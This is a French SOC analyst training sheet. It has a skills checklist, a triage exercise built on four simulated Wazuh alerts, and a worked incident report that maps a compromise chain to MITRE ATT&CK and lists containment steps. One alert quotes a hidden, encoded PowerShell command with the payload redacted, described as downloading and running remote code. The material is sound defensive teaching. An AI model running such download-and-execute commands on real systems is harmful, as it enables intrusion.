**Solution** : Compléter la détection par IoC avec la détection par TTP (Tactics, Techniques and Procédures). Les TTP sont beaucoup plus difficiles à changer pour un attaquant. Par exemple, détecter "PowerShell qui télécharge et exécute du code" (TTP) est plus durable que détecter une IP spécifique (IoC).

---

## Checklist de Validation

- [ ] Je sais expliquer le rôle d'un SOC et la différence entre L1, L2 et L3
- [ ] Je sais installer et configurer Wazuh (SIEM open source)
- [ ] Je sais déployer un agent Wazuh sur un endpoint Linux ou Windows
- [ ] Je sais configurer la collecte de logs via syslog
- [ ] Je sais écrire une règle Sigma et la convertir pour différents SIEM
- [ ] Je sais écrire une règle YARA pour détecter un fichier malveillant
- [ ] Je connais les 14 tactiques MITRE ATT&CK et je sais naviguer dans la matrice
- [ ] Je sais effectuer un triage d'alerte L1 (décoder, analyser, classifier, escalader)
- [ ] Je comprends les IoC et les formats STIX/TAXII
- [ ] Je sais créer une règle de détection dans Wazuh

---

## Exercice Pratique

**Énoncé** : Tu es analyste SOC L1. Le SIEM (Wazuh) affiche les alertes suivantes en rafale pendant la nuit. Tu dois les trier et rédiger un rapport.

Alerte 1 : 02h15 - Suspicious PowerShell Execution sur DESKTOP-COMPTA03

- CommandLine : `powershell -nop -w hidden -enc [base64]`
- Utilisateur : CORP\marie.martin
- IP source : 192.168.10.55

Alerte 2 : 02h17 - New Service Installed sur DESKTOP-COMPTA03

- ServiceName : WindowsUpdateService
- ServicePath : C:\Users\Public\svc.exe
- Utilisateur : SYSTEM

Alerte 3 : 02h18 - Outbound Connection to Known Malicious IP depuis DESKTOP-COMPTA03

- Destination : 185.220.101.34:443
- Processus : svc.exe

Alerte 4 : 02h45 - Failed Login Attempt sur DC01 depuis 192.168.10.55

- Utilisateur cible : Administrator
- Nombre de tentatives : 47 en 10 minutes

Pour chaque alerte :

1. Décode et analyse le contenu
2. Identifie la tactique MITRE ATT&CK
3. Classifie (vrai positif / faux positif)
4. Détermine la sévérité
5. Définis l'action (résoudre, escalader)
6. Rédige un rapport d'incident consolidé reliant toutes les alertes

**Indications** :

- Les alertes semblent liées entre elles (même machine source, même fenêtre temporelle)
- L'heure (02h-03h) est en dehors des heures de travail
- Reconstruis la chronologie de l'attaque
- Utilise le framework MITRE ATT&CK pour documenter chaque étape

**Résultat attendu** : Un rapport d'incident structuré avec la chronologie de l'attaque, le mapping MITRE ATT&CK, et les recommandations de confinement.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

```text
## Rapport d'Incident - INC-2026-0319-001

### Résumé exécutif
Un incident de sécurité a été détecté le 19/03/2026 entre 02h15 et 02h45 UTC
sur le poste DESKTOP-COMPTA03 (192.168.10.55). L'analyse révèle une chaîne
d'attaque complète : exécution de code malveillant, installation de persistance,
communication avec un serveur C2, et tentative de mouvement latéral vers le
contrôleur de domaine.

### Chronologie de l'attaque

02h15 - EXECUTION (T1059.001 - PowerShell)
  Alerte 1 : PowerShell encodé exécuté en mode caché (-nop -w hidden)
  par le compte marie.martin. La commande décodée télécharge et exécute
  un payload depuis un serveur distant.
  Classification : VRAI POSITIF - Sévérité CRITIQUE

02h17 - PERSISTENCE (T1543.003 - Windows Service)
  Alerte 2 : Un nouveau service "WindowsUpdateService" est installé.
  Le binaire (svc.exe) est dans C:\Users\Public\ (emplacement suspect,
  non standard pour un service légitime).
  Classification : VRAI POSITIF - Sévérité HAUTE

02h18 - COMMAND AND CONTROL (T1071.001 - Web Protocols)
  Alerte 3 : svc.exe établit une connexion sortante vers 185.220.101.34:443
  (IP connue comme nœud Tor / serveur C2).
  Classification : VRAI POSITIF - Sévérité CRITIQUE

02h45 - LATERAL MOVEMENT (T1110.001 - Password Guessing)
  Alerte 4 : 47 tentatives de connexion échouées sur DC01 avec le compte
  Administrator, depuis la machine compromise 192.168.10.55.
  Classification : VRAI POSITIF - Sévérité CRITIQUE

### Mapping MITRE ATT&CK

| Heure | Tactique            | Technique               | ID        |
| ----- | ------------------- | ----------------------- | --------- |
| 02h15 | Execution           | PowerShell              | T1059.001 |
| 02h17 | Persistence         | Windows Service         | T1543.003 |
| 02h18 | Command and Control | Web Protocols (HTTPS)   | T1071.001 |
| 02h45 | Credential Access   | Password Guessing       | T1110.001 |
| 02h45 | Lateral Movement    | Brute Force             | T1110     |

### Actions recommandées (URGENTES)

1. CONFINEMENT IMMÉDIAT :
   - Isoler DESKTOP-COMPTA03 du réseau (désactiver le port switch ou VLAN)
   - Bloquer l'IP 185.220.101.34 sur le pare-feu (entrée et sortie)
   - Désactiver le compte marie.martin dans Active Directory
   - Réinitialiser le mot de passe du compte Administrator sur DC01

2. INVESTIGATION (L2/L3) :
   - Analyser le binaire svc.exe (hash, sandbox, YARA)
   - Vérifier si d'autres machines communiquent avec 185.220.101.34
   - Analyser les logs de messagerie de marie.martin (vecteur initial probable : phishing)
   - Vérifier l'intégrité du contrôleur de domaine DC01

3. REMÉDIATION :
   - Supprimer le service WindowsUpdateService et le binaire svc.exe
   - Réinstaller le poste DESKTOP-COMPTA03 à partir d'une image propre
   - Lancer un scan de vulnérabilités sur le segment réseau 192.168.10.0/24

### Escalade
Incident escaladé au L2 à 03h00 UTC pour investigation approfondie.
Notification envoyée au RSSI conformément à la procédure d'incident critique.
```

---

## Navigation

← Fiche précédente : **[03 - Analyse de vulnérabilités et Reconnaissance](03-analyse-vulnerabilites.md)**
